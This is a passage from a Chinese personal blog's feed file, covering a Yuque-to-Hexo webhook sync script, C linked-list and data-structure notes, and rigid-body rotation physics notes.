src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941824763-c08f08ac-4f61-4268-b915-649dc8550a7a.png#clientId=u369d245c-eb95-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=587&amp;id=u703a0379&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=734&amp;originWidth=1292&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=32641&amp;status=done&amp;style=none&amp;taskId=ud119ea14-84de-4920-8134-71dd38b8097&amp;title=&amp;width=1033.6#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=eyHeT&amp;originHeight=734&amp;originWidth=1292&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941932601-8fe0dd1e-1b62-4263-9d71-c100f1056780.png#clientId=u97a4b066-8567-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=654&amp;id=uec986734&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=817&amp;originWidth=1492&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=52410&amp;status=done&amp;style=none&amp;taskId=u584d7fd1-e1a5-4517-a749-6236ac225fd&amp;title=&amp;width=1193.6#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Xdkbm&amp;originHeight=817&amp;originWidth=1492&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647942442790-8fb37e7b-06da-4f17-ba0a-711560e1f781.png#clientId=u97a4b066-8567-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=0.7118&amp;from=drop&amp;height=648&amp;id=ub1aecd42&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%97%A0%E6%A0%87%E9%A2%98.png&amp;originHeight=648&amp;originWidth=1152&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=15643&amp;status=done&amp;style=none&amp;taskId=u2f4d51e7-55b4-45bf-aba6-fa1a1ef0e5b&amp;title=&amp;width=1152#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=ds5u5&amp;originHeight=648&amp;originWidth=1152&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="无标题.png"></p></div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    r = requests.post(<span class="string">&quot;https://api.github.com/repos/[GitHub]/[存放博客源码的仓库]/dispatches&quot;</span>,</span><br><span class="line">    json = &#123;<span class="string">&quot;event_type&quot;</span>: <span class="string">&quot;run-it&quot;</span>&#125;,</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&#x27;curl/7.52.1&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.everest-preview+json&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;token *******************&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">204</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This&#x27;s OK!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> r.status_code</span><br></pre></td></tr></table></figure><h1>配置语雀的 webhook</h1><p>设置触发规则<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647942535773-0abc31b1-60c8-459a-85ce-e1356af28d4d.png#clientId=u97a4b066-8567-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=368&amp;id=u5c3151ba&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=460&amp;originWidth=319&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53892&amp;status=done&amp;style=none&amp;taskId=u1b992888-4776-47ce-8d64-978904f609c&amp;title=&amp;width=255.2#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=UMDSF&amp;originHeight=460&amp;originWidth=319&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647942582907-fd1d01dc-d9ae-42cd-b043-6f595a26ca8c.png#clientId=ud80c3e2c-185a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=521&amp;id=uc6e41eff&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=547&amp;originWidth=1049&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22384&amp;status=done&amp;style=none&amp;taskId=u3ceb93a0-ebf1-4690-80d9-efa34400dd3&amp;title=&amp;width=1000#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=e1eOl&amp;originHeight=547&amp;originWidth=1049&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p><h1>小结</h1><p>如果不会配置，可以来找橙子魔法师 🎃</p>]]></content>
      
      
      <categories>
          
          <category> 🧹魔法扫帚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 语雀 </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/posts/oirlsf/"/>
      <url>/posts/oirlsf/</url>
      
        <content type="html"><![CDATA[<h2 id="静态链表和动态链表">静态链表和动态链表</h2><h3 id="静态链表">静态链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  h NULL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span> <span class="comment">//node是结点的意思</span></span><br><span class="line"><span class="type">long</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span>  <span class="comment">//结点中有二个数据：data，node类型的next指针</span></span><br><span class="line">&#125;;</span><br><span class="line">main()&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">a</span>,<span class="title">b</span>,<span class="title">c</span>,*<span class="title">h</span>,*<span class="title">p</span>;</span></span><br><span class="line">a.data =<span class="number">10</span>;</span><br><span class="line">b.data =<span class="number">20</span>;</span><br><span class="line">c.data =<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">h=&amp;a;  <span class="comment">//h是头指针，固定不动的 P指针进行游走遍历</span></span><br><span class="line">a.next =&amp;b;</span><br><span class="line">b.next =&amp;c;</span><br><span class="line">c.next =<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">p=h;  <span class="comment">//初始化p指向头指针</span></span><br><span class="line"><span class="keyword">while</span>(p)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态链表">动态链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">//调用malloc函数需要stdlib库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN sizeof(struct student)  <span class="comment">//可以简单的理解为将程序中所有的&quot;LEN&quot;替换为&quot;sizeof(struct student)&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">long</span> num;</span><br><span class="line"><span class="type">float</span> score;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">next</span>;</span> <span class="comment">//定义一个student类型的结构体指针，用于链表的链接</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//n是一个全局变量，用于记录有多少个学生信息在这个链表中</span></span><br><span class="line"><span class="keyword">struct</span> student *<span class="title function_">creat</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//链表创建函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p1</span>,*<span class="title">p2</span>;</span></span><br><span class="line">n=<span class="number">0</span>;</span><br><span class="line">p1=p2=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(LEN);<span class="comment">//在标准库中malloc函数给到的是一个void类型的空间，需要用强制转换符来获得合适类型的空间</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld,%f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);<span class="comment">//录入第一个学生信息</span></span><br><span class="line">head=<span class="literal">NULL</span>;<span class="comment">//在不确定信息是否有效时，动态链表应该为空，也即头指针指向为空</span></span><br><span class="line"><span class="keyword">while</span>(p1-&gt;num!=<span class="number">0</span>)<span class="comment">//这里假定学生学号不为零，若输入零代表这个动态链表结束链接</span></span><br><span class="line">&#123;</span><br><span class="line">n=n+<span class="number">1</span>;<span class="comment">//每录入一个学生信息，n就加一</span></span><br><span class="line"><span class="comment">//当录入第一个学生信息之后，这个学生信息的地址就作为链表的头指针，让head指向p1（此时p1、p2都指向第一个学生信息）</span></span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)head=p1;</span><br><span class="line"><span class="comment">//如果录入的学生信息不是第一个，那么（由后面的操作）p1此时指向的是这个学生信息的地址，而p2指向的是上一个学生信息地址</span></span><br><span class="line"><span class="comment">//此时需要让p2-&gt;next指向p1，也即让上一个链表成员与新的成员链接起来</span></span><br><span class="line"><span class="keyword">else</span> p2-&gt;next=p1;</span><br><span class="line">p2=p1;<span class="comment">//再让p2向前指一位，以便于下次操作，此时p1、p2都指向最新加入链表的成员</span></span><br><span class="line">p1=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(LEN);<span class="comment">//让p1开辟新的studdent类型的空间，输入下一个链表成员信息。可以理解为while循环中的x++</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld,%f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);</span><br><span class="line">&#125;</span><br><span class="line">p2-&gt;next=<span class="literal">NULL</span>;<span class="comment">//最后一位链表成员不再链接其他东西，这里的指向NULL相当于表尾</span></span><br><span class="line"><span class="keyword">return</span> (head); <span class="comment">//向主函数返回构造好的动态链表d的第一个结点的地址</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> student *head)</span><span class="comment">//构造结构体输出函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow,These %d records are:\n&quot;</span>,n);</span><br><span class="line">p=head;</span><br><span class="line"><span class="keyword">if</span>(head!=<span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %5.1f\n&quot;</span>,p-&gt;num,p-&gt;score);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>* <span class="title">pt</span>;</span></span><br><span class="line"> pt=creat();</span><br><span class="line"> print(pt);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="运算符-和-的区别">运算符  . 和 -&gt; 的区别</h3><table><thead><tr><th style="text-align:left">操作对象</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">结构体变量</td><td style="text-align:left">. 访问结构体成员</td></tr><tr><td style="text-align:left">指向结构体变量的指针</td><td style="text-align:left">-&gt; 访问结构体成员</td></tr></tbody></table><h2 id="绪论">绪论</h2><h3 id="基本概念">基本概念</h3><ol><li><p>数据是信息的载体，它能够被计算机识别、存储和加工处理</p></li><li><p>数据元素是数据的基本单位</p></li><li><p>数据对象是具有相同性质的数据元素的集合</p></li><li><p>数据结构是指数据元素之间的相互关系</p></li><li><p>数据的四种逻辑关系</p></li></ol><p>① 集合结构：数据元素的有限集合。数据元素之间除了“属于同一个集合”的关系之外没有其他关系。</p><p>② 线性结构：数据元素的有序集合。数据元素之间形成一对一的关系。</p><p>③ 树型结构：树是层次数据结构，树中数据元素之间存在一对多的关系。</p><p>④ 图状结构：图中数据元素之间的关系是多对多的。</p><ol start="6"><li>抽象数据结构(ADT)可以用以下的三元组来表示：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADT抽象数据类型名&#123;</span><br><span class="line">    数据对象：&lt;数据对象的定义&gt;</span><br><span class="line">    数据关系：&lt;数据关系的定义&gt;</span><br><span class="line">    基本操作：&lt;基本操作的定义&gt;</span><br><span class="line">&#125; ADT抽象数据类型名</span><br></pre></td></tr></table></figure><ol start="7"><li>算法五个特性</li></ol><p>① 有限性</p><p>② 确定性</p><p>③ 可行性</p><p>④ 输入 （零个或多个输入）</p><p>⑤ 输出 （一个或多个输出）</p><h3 id="时间复杂度">时间复杂度</h3><p>定义：设问题的规模为 n，把一个算法的时间耗费 T(n)称为该算法的时间复杂度，它是问题规模为 n 的函数。</p><p>常用的算法的时间复杂度的顺序：（比较时只看最高次幂）</p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.24y7agfycsn4.webp#alt=%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span> , i &lt; = n , i++ ) &#123;            =&gt;O(n)</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span> , i &lt; = n , i++ ) &#123;        =&gt;O(n²)</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">1</span> , i &lt; = <span class="number">1</span> , i++ )&#123;     =&gt;O(n²)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">T(n) = O(n²)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 🔔魔法铃铛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学物理</title>
      <link href="/posts/cubnfn/"/>
      <url>/posts/cubnfn/</url>
      
        <content type="html"><![CDATA[<h1>第二章刚体的定轴转动</h1><h2 id="刚体的运动描述">刚体的运动描述</h2><h3 id="刚体">刚体</h3><ol><li>刚体：在外力作用下，形状和大小都不发生变化的物体</li><li>刚体也是一个理想化模型</li><li>刚体可以看作是由“一系列”质点组成的，称为质点组</li></ol><h3 id="刚体的运动">刚体的运动</h3><p>刚体的运动包括平动、转动。</p><ol><li>平动：在运动过程中刚体上的任意一条直线在各个时刻的位置都相互平行</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.xrni1fhfmpc.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=BAruW&amp;originHeight=252&amp;originWidth=470&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><ol start="2"><li>转动：组成刚体的各质点都绕同一直线做圆周运动，我们说刚体在转动。这条线为转轴</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.5cwadznip280.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=NkrNP&amp;originHeight=434&amp;originWidth=471&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="描述刚体运动的物理量">描述刚体运动的物理量</h3><ol><li>角坐标 θ  单位：弧度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>a</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">rad</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span></span></span></span></li><li>角位移 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>△</mtext><mi>θ</mi><mo>=</mo><mi>θ</mi><mo>−</mo><msub><mi>θ</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">△θ = θ - θ_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">△</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>     单位：弧度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>a</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">rad</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span></span></span></span></li><li>角速度 ω   描写刚体转动快慢和方向的物理量     单位：弧度/秒，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">rad/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.41su4loxhpy0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=EwCmm&amp;originHeight=415&amp;originWidth=1163&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""><br><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.2kuyu190naq0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=ItDq4&amp;originHeight=522&amp;originWidth=744&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""><br><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.63reh0r2b880.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=vy3rs&amp;originHeight=384&amp;originWidth=566&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><ol start="4"><li>角加速度 β   描写角速度变化快慢和方向的物理量</li></ol><p>单位：弧度/秒 ²，rad/s²     方向：角速度变化的方向</p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.57yutxy29qs0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=qutDs&amp;originHeight=170&amp;originWidth=855&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><ol start="6"><li>位移与角位移之间的关系   △s = r△θ</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.5kjeaigucds0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=KB33Y&amp;originHeight=389&amp;originWidth=649&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><ol start="7"><li>速度与角速度之间的关系   ν = rω</li><li>加速度与角加速度之间的关系</li></ol><p>切向加速度   at = rβ<br>法向加速度   an = rω²<br>线加速度   a = √[at²+an²] = √[(rβ)²+(rω²)²]<br><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.63bjrwyntvc0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=XM8of&amp;originHeight=352&amp;originWidth=682&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h2 id="刚体定轴转动定律">刚体定轴转动定律</h2><h3 id="转动惯量">转动惯量</h3><ul><li>物理意义：刚体转动惯性的量度</li><li>对于质量离散分布刚体的转动惯量</li><li>单位：千克·米 ² ，kg · m²</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.1sk5s3gkml40.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=gF2SJ&amp;originHeight=441&amp;originWidth=1113&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="质量连续分布刚体的转动惯量计算">质量连续分布刚体的转动惯量计算</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648555567694-edc0d563-12c9-4e49-9f72-ca19b73738b3.png#clientId=uffb699d3-b563-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=474&amp;id=u4c551d18&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=592&amp;originWidth=959&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57565&amp;status=done&amp;style=none&amp;taskId=ue1044a54-0d23-4790-b0e5-8ee7815abac&amp;title=&amp;width=767.2" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648557074551-ad78abe1-135f-4a4e-aa84-748fbf01c1ec.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=1522&amp;id=uc2172c83&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=1903&amp;originWidth=1879&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=922073&amp;status=done&amp;style=none&amp;taskId=u78d17420-0b88-4bfd-8915-00361802fa0&amp;title=&amp;width=1503.2" alt="图片.png"></p><h3 id="平行轴定理">平行轴定理</h3><p>刚体绕平行于质心轴的转动惯量 J，等于绕质心轴的转动惯量 JC 加上刚体质量与两轴间的距离平方的乘积。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648555773534-3c0e8510-d59f-492e-aa82-c46501c9687a.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=303&amp;id=ue1eca002&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=379&amp;originWidth=901&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23692&amp;status=done&amp;style=none&amp;taskId=ub6e84c3b-eaef-4678-948e-e0b8ef882a3&amp;title=&amp;width=720.8" alt="图片.png"></p><h3 id="力矩">力矩</h3><p>右手定则：从 r 沿小于 p 角右旋到 F，大拇指指向。<img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648555887290-84150752-8673-47c7-8ed9-9b509987f18f.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=355&amp;id=ud8883ffc&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=444&amp;originWidth=1002&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=35827&amp;status=done&amp;style=none&amp;taskId=uf0ab9975-5604-4d17-8813-ad459a74651&amp;title=&amp;width=801.6" alt="图片.png"></p><h3 id="转动定律">转动定律</h3><p>合外力矩等于刚体的转动惯量与角加速度的乘积</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648556278260-45d787d9-4c76-4498-95fe-2159115d7536.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=148&amp;id=u451a83f1&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=185&amp;originWidth=783&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=6021&amp;status=done&amp;style=none&amp;taskId=u7b3cb7e7-d673-4b04-801b-f7ed7e9c7dc&amp;title=&amp;width=626.4" alt="图片.png"></p><h2 id="力矩的功与转动功能">力矩的功与转动功能</h2><h3 id="力矩的功">力矩的功</h3><p><img 